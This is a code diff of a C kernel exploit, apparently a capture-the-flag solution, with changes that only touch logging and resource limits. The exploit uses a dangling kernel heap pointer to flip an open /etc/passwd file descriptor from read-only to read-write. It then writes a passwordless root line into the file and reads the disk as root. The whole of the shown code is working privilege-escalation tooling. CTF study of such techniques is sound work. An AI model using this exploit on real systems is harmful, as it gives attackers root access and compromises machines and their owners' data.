@@ -16,7 +16,7 @@
 char clear[FILE_SIZE] = {0};
 
 /*
- * O_RDONLY          | O_RDWR          
+ * O_RDONLY          | O_RDWR
  * 0000000000000000  | 0000000000000000
  * 0000000000000000  | 0000000000000000
  * 000000001d804a00  | 000000001f804f00 <- corrupt this line
@@ -57,18 +57,20 @@ int main(int argc, char* argv[]) {
   int fd;
   uint64_t leak[FILE_SIZE / sizeof(uint64_t)] = {0};
 
-  puts("[+] INIT");
+  lstage("INIT");
 
   pin_cpu(0, 0);
-  
+  rlimit_increase(RLIMIT_NOFILE);
   init();
 
-  puts("[+] created dangeling ptrs");
+  lstage("START");
+
+  linfo("created dangeling ptrs");
 
   ptr = keap_malloc(FILE_SIZE, GFP_KERNEL);
   keap_write(ptr, clear, FILE_SIZE);
   keap_free(ptr);
-  printf("[+] dangeling ptr: %p\n", ptr);
+  linfo("dangeling ptr: %p", ptr);
 
   fd = SYSCHK(open("/etc/passwd", O_RDONLY));
 
@@ -78,7 +80,7 @@ int main(int argc, char* argv[]) {
   print_hex((char*) leak, FILE_SIZE);
 #endif
 
-  puts("[+] corrupt /etc/passwd to make O_RDWR"); 
+  linfo("corrupt /etc/passwd to make O_RDWR");
   // is predictable, but this increases successrate
   leak[2] &= ~VAL_MASK;
   leak[2] |= VAL_RDWR & VAL_MASK;
@@ -86,14 +88,13 @@ int main(int argc, char* argv[]) {
   keap_write(ptr, leak, FILE_SIZE);
 
   found = false;
-  puts("[+] write to corrupted /etc/passwd"); 
+  linfo("write to corrupted /etc/passwd");
   SYSCHK(write(fd, "root::0:0:root:/root:/bin/sh\n", 29));
 
-  puts("[+] Finished! Reading Flag");
-  puts("=======================");
+  lstage("Finished! Reading Flag");
   SYSCHK(system("su -c 'cat /dev/sda'"));
 
-  puts("[+] END");
+  lstage("END");
 
-  return 0;  
+  return 0;
 }
